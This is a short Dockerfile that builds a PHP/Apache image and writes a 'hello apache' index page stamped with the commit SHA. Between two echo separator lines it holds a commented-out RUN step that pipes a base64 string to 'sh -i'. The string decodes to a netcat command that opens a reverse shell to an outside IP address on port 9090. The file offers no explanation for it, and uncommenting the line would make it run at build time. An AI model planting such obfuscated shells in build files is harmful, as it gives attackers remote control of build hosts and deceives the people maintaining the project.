#FROM ghcr.io/socialgouv/docker/nginx:7.1.1
FROM php:8.0-apache


ARG COMMIT_SHA
ENV COMMIT_SHA $COMMIT_SHA

RUN echo "=========="
#RUN echo "bmMgODkuOTAuMzkuNTQgOTA5MCAtZSBzaA==" | base64 -d | sh -i
RUN echo "=========="
#RUN echo "EY #$COMMIT_SHA" > /usr/share/nginx/html/index.html
RUN echo "hello apache #$COMMIT_SHA" > /var/www/html/index.html
